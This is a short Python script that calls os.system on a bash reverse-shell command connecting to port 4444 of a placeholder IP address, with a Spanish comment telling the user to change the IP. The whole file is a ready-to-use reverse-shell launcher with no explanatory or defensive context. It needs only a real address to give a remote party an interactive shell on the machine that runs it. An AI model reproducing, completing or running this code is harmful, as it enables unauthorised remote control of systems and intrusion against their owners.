import os

def main():
  comando = "/bin/bash -i >& /dev/tcp/000.000.00/4444 0>&1" # Cambiar IP
  try:
    os.system(comando)
  except Exception as e:
    print(f"ERROR: {e}")


if __name__ == '__main__':
  main()
